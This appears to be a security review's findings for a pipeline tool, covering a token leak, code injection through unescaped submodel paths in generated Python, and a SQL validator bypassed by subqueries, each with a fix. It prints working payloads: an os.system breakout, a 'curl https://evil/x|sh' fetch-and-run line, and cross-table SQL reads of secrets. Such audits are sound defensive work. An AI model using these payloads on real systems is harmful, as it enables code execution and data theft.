findings.recommended_fix: Do not dispense the session token from an unauthenticated endpoint. Preferred: stop embedding the token in HTML entirely and instead set it as an HttpOnly, SameSite=Strict, Secure-where-applicable cookie scoped to the loopback host, issued only on a request that already proves locality, and have the frontend send it back automatically (cookie) or fetch it from a token endpoint that is itself behind the Origin+token gate. If the inline-bootstrap approach must stay, gate the index route exactly like /api/*: when local_session_auth_disabled() is False, require _is_local_origin(request.headers) for the document request AND only inline the token when the request demonstrably originates from the local UI (e.g. require the Origin/Referer to be local AND that the connection is loopback), returning the shell WITHOUT the token otherwise (the SPA can then obtain it via an authenticated channel). At minimum, refuse to inline the token whenever the effective trusted-host configuration is wildcard ('*') or the bind is non-loopback, and add a regression test asserting that `GET /` with a foreign Origin / from a non-loopback peer does NOT contain window.__HAUTE_SESSION_TOKEN__. Independently, reconsider defaulting `--host 0.0.0.0` to wildcard trusted hosts (it disables the Host gate, the only remaining filter in front of the token-bearing page).

findings.title: Submodel name / file field code-injected into emitted pipeline.submodel("...") call via bare-quote f-string (no _safe_path/_safe_str)
findings.description:
When a graph contains submodels, graph_to_code_multi emits the main file's submodel import lines as:

    sm_path = sm_meta.get("file", f"modules/{sm_name}.py").replace("\\", "/")
    sm_imports.append(f'pipeline.submodel("{sm_path}")')

sm_path is interpolated into the generated Python with bare double-quotes and NO escaping. Its value is fully attacker-controlled in the shared/imported-pipeline trust model: it is either submodels[name]["file"] (an arbitrary string on the PipelineGraph) or, when "file" is absent, the default f"modules/{sm_name}.py" built from the submodel dict KEY (also arbitrary). Both are accepted verbatim by the Pydantic model (submodels: dict[str, Any]) with no charset constraint.

This is the exact bare-f-string-with-bare-quotes class the codebase already fixed elsewhere: connect() ports were hardened with json.dumps after the adversarial review's "C2" finding (codegen.py:776-794), every user string goes through _safe_str / _safe_path / _sanitize_description, instance of="..." and connect("a","b") use codegen-derived *sanitized identifiers* (safe). The submodel import line is the one place an arbitrary (non-sanitized) string is dropped into code position behind bare quotes — it was missed.

Critically, the final emission gate _assert_emitted_files_parse (codegen.py:819-843, runs ast.parse on every file) does NOT stop this, because the payload is crafted to be syntactically valid Python: the breakout closes the string, adds a real expression, and comments out the trailing ")  with a #. The contrast is intentional in the code's own comments at line 776 ('bare f-string interpolation breaks on label = a"b') — yet that lesson was not applied here.

Verified empirically against the real graph_to_code_multi (uv run): with submodels={'mod1': {'file': 'modules/m.py") or __import__("os").system("echo PWNED")  #', ...}} the emitted main.py line is:

    pipeline.submodel("modules/m.py") or __import__("os").system("echo PWNED")  #")

ast.parse succeeds (PARSES_OK: True). The submodel-NAME vector (no explicit 'file') reproduces identically via the default modules/<name>.py path. Note _safe_path's backslash->slash normalisation does not help: the payload uses no backslashes and the double-quote it contains is never escaped.
findings.exploit_scenario: A user imports / opens a shared pipeline (a PipelineGraph JSON, an exported project, a teammate's pipeline) whose submodels map carries a crafted name or file field, e.g. file = 'modules/m.py") or __import__("os").system("curl https://evil/x|sh")  #'. The moment that graph is round-tripped through codegen — on save (routes/_save_pipeline.py:518 calls graph_to_code_multi and writes the result) or on any deploy/bundle path that regenerates source — the emitted main.py contains a module-level expression that runs the attacker command. main.py is in the save-route output allowlist (it matches source_file), so it IS written to disk; the per-file output-path check (_validate_output_rel_path) only constrains the *filename* of module outputs, never the file *content*, and _validate_unique_sanitized_names only checks node labels, not submodel names/files — so nothing upstream neutralises this. The payload then executes when the saved pipeline is loaded/run (the normal next step after a save), achieving arbitrary code execution on the operator's machine (or the CI/deploy host) from nothing more than opening or deploying a shared pipeline. This breaks precisely the boundary the trust model calls out: 'what breaks if pipeline source/config is attacker-influenced (a shared pipeline, an imported submodel).'
findings.recommended_fix:
Emit the path through the existing literal helper instead of bare quotes — change line 1241 to use _safe_path:

    sm_imports.append(f'pipeline.submodel({_safe_path(sm_path)})')

(_safe_path is already imported in codegen.py and escapes backslashes, quotes, and newlines.) This makes the value a proper Python string literal that cannot break out, exactly like connect()'s json.dumps fix and every other string emission. Additionally (defence in depth, separate from this line) consider validating submodel names/file fields at the model/save boundary the same way node labels are validated, so a submodel name that is not a safe identifier and a file that is not a clean modules/<sanitized>.py path are rejected before codegen rather than relied upon to be sanitized only on the happy-path UI route (_submodel_ops.py:38).
findings.recommended_fix_note: A failing test should assert that graph_to_code_multi with a submodel file/name containing a double-quote either escapes it (round-trips as a literal) — i.e. the emitted pipeline.submodel argument ast-parses to a single Constant string equal to sm_path — covering both the explicit-file and default-name vectors.

results.boundary_assessment: Adequate-for-local-trust but with one genuinely weak spot that breaks once content is shared/imported. The codegen string-safety story is otherwise SOLID and clearly well-considered: _safe_str / _safe_path / _sanitize_description correctly resist triple-quote runs, backslash escapes (\\U, \\N{...}), embedded newlines, and Unicode line/paragraph separators (I verified LS/PS/NEL/FF/VT inside double-quoted literals do not break Python source, so not escaping them in _safe_str is fine); _sanitize_func_name guarantees a valid identifier so the many bare-quote interpolations of *func names* (instance of=, connect(\"a\",\"b\")) are safe; every config VALUE reaches code via repr() or these helpers, and repr() of JSON-derived str/int/float/bool/None/list/dict is always a valid Python literal, so column names / arbitrary config values cannot inject; explore-overview and edge-join kwargs are validated/whitelisted; the _assert_emitted_files_parse gate catches accidental syntax corruption. The user-code (config['code']), preamble, and preserved_blocks paths emit raw Python by design — that is the documented trust model (haute executes user-authored pipeline code) and is gated by ast.parse + a separate exec sandbox (_sandbox.py), so it is not a NEW codegen-injection beyond 'haute runs your pipeline.' The single real gap is codegen.py:1241: the submodel import line is the lone place an UN-sanitized arbitrary string (submodel file/name) is interpolated behind bare quotes into code position, and a syntactically-valid breakout sails past the ast.parse gate. It is a one-line fix (use _safe_path, mirroring the already-applied connect() hardening) and, once fixed, this boundary is solid.

findings.location: src/haute/_databricks_io.py:63-84 (_validate_select_clause) and :303-308 (sql_query = f"{select_clause} FROM {table}"); reachable via src/haute/routes/databricks.py:150-180 (POST /api/databricks/fetch, body.query) and src/haute/_codegen_builders.py:318-327 (query={query!r} round-tripped through @pipeline.data_source)
findings.title: Databricks SELECT-clause validator is a keyword denylist that does NOT constrain which tables a query reads — a shared pipeline's `query` field can exfiltrate any table the operator's token can reach (the table-name allowlist is a false guarantee)
findings.description: fetch_and_cache builds `sql_query = f"{select_clause} FROM {table}"` where `table` is tightly allowlisted by `_TABLE_NAME_RE` (catalog.schema.table) but `select_clause` is attacker-controlled free text only passed through `_validate_select_clause`. That validator is a pure denylist: it requires a leading SELECT, forbids `;`, `--`, `/*`, and the keywords DROP/DELETE/INSERT/UPDATE/ALTER/TRUNCATE/EXEC/EXECUTE/CREATE/GRANT/REVOKE/UNION/LATERAL. It performs NO restriction on which tables the SELECT body references. A read-only SELECT that embeds a scalar/correlated subquery in its projection list reads an entirely different table than the allowlisted FROM target, and the assembled statement is valid Databricks SQL. The catalog.schema.table allowlist therefore creates a false sense that 'fetch can only read the named table'; the `query` field defeats it. The exfiltrated data is written to the local parquet cache (.haute_cache/) and is subsequently readable through GET /api/schema/databricks and the pipeline executor. Note SSRF is NOT a concern here: `server_hostname` is pinned to the operator's DATABRICKS_HOST env var, so the connection target host cannot be redirected; the issue is read-scope, not host control. I verified the bypass: validate(query) passes and the final SQL is well-formed for: query="SELECT *, (SELECT max(token) FROM admin_secrets.kv.api_tokens) AS leaked", table="myteam.analytics.policies" -> "SELECT *, (SELECT max(token) FROM admin_secrets.kv.api_tokens) AS leaked FROM myteam.analytics.policies". This is distinct from the two existing exhaustive findings on _validate_select_clause, which only flag it OVER-blocking legitimate keywords-as-data (a usability bug); none flag the UNDER-restriction / cross-table-read security gap.
findings.exploit_scenario: A teammate shares (or an importer imports) a pipeline .py whose Databricks data-source node carries config like `@pipeline.data_source(table="shared.demo.policies", http_path="/sql/1.0/warehouses/abc", query="SELECT *, (SELECT collect_list(secret) FROM finance.pii.salaries) AS x")`. The table passes _TABLE_NAME_RE and looks benign; the operator opens the pipeline and clicks 'Fetch Data', which POSTs {table, http_path, query} to /api/databricks/fetch. _validate_select_clause accepts the query (no banned keyword, no comment, no semicolon), and the connector runs it against the operator's own Databricks workspace/token. Rows from finance.pii.salaries — a table the shared pipeline was never granted in its visible FROM — are materialised into the local parquet cache and exposed via the schema-preview endpoint and any pipeline run reading that source. The allowlist gave the reviewer false confidence that only shared.demo.policies could be read.
findings.recommended_fix: Stop relying on a keyword denylist over free-form SQL. Preferred: drop the arbitrary `query` field for the fetch path and build the statement from structured, validated parts only — e.g. an explicit allowlisted column list plus an optional WHERE built from parameterised predicates, with every table reference forced to equal the allowlisted `table` (reject any query whose parsed table set is not exactly {table}). If a free-form projection must be retained, parse the query with a real SQL parser (e.g. sqlglot) and (a) assert it is a single read-only SELECT, (b) enumerate ALL table references (including subqueries/CTEs) and reject anything other than the single allowlisted `table`, and (c) reject subqueries/derived tables entirely if cross-table reads are unwanted. Also quote/normalise the interpolated `table` consistently (the optional-backtick acceptance in _TABLE_NAME_RE means quoting is asymmetric — see the existing cache-fragmentation finding). Per CLAUDE.md, first add a failing test asserting that a fetch whose query references a table other than the allowlisted one is rejected (not cached). Keep the existing fail-loud ValueError but route it to a 400 at the route (the route currently turns these ValueErrors into an opaque 500 — see exhaustive finding on fetch_databricks_table lacking _validate_table_param).

results.boundary_assessment:
Mixed: the HTTP route layer of this boundary is SOLID, but the Databricks query construction is GENUINELY WEAK once content is shared/imported.

Solid / adequate-for-local-trust:
- json_cache.py uniformly resolves both data_path and config_path via resolve_runtime_file_path(..., enforce_project_root=True) and maps embedded-null to 400, out-of-root to 403; even the stub /cancel and read-only /progress run the same path guard so they can't be used as traversal probes. Errors are sanitized to _INTERNAL_ERROR_DETAIL.
- files.py routes everything through validate_safe_path(base, ...), which rejects NUL bytes (400) and uses .resolve() + is_relative_to(base) so an in-root symlink pointing outside is correctly rejected (resolve() follows the link before the containment check). Schema-read errors are sanitized.
- load_external_object correctly gates on validate_project_path() and deserializes via the restricted unpickler / restricted joblib NumpyUnpickler with a narrow module allowlist. read_user_text itself does no path validation, but all four production callers (routes/pipeline.py, routes/utility.py, routes/_helpers.py x2, deploy/_config.py, deploy/_validators.py) validate or constrain the path upstream (validate_safe_path / _validate_module_name / discover_pipelines).
- No zip/tar/archive extraction surface exists anywhere in src/ (no zipfile/tarfile/extractall/UploadFile), so zip-slip is not applicable to this codebase.
- SSRF is bounded: dbsql.connect server_hostname is pinned to the operator's DATABRICKS_HOST env var; http_path only selects a warehouse path on that fixed host, so it cannot redirect to an arbitrary host.

Genuinely weak (breaks under shared/imported content):
- The Databricks fetch `query` field is validated by a keyword denylist that never restricts which TABLES the SELECT body reads (the reported finding). The catalog.schema.table allowlist looks protective but is fully bypassable via subqueries, so a shared pipeline's data-source config can read any table the operator's token can reach. This is the one item I'd fix before treating shared/imported Databricks pipelines as safe.

Already-catalogued (NOT re-reported): _io.read_source/_validate_source_path apply no project-root containment for ABSOLUTE paths, so the executor read path can read arbitrary host files when a graph's dataSource.path is attacker-influenced (review/02-findings #30, repro platform__executor-path-resolution-no-enforce-project-root.py); backtick-quoted table names fragment the cache (exhaustive B053); _validate_select_clause over-blocks legitimate keyword-as-data queries (exhaustive B053); fetch_databricks_table omits _validate_table_param yielding a 500 instead of 400 (exhaustive). My SQL finding is the inverse (under-restriction) of the catalogued over-restriction item and is not otherwise covered.
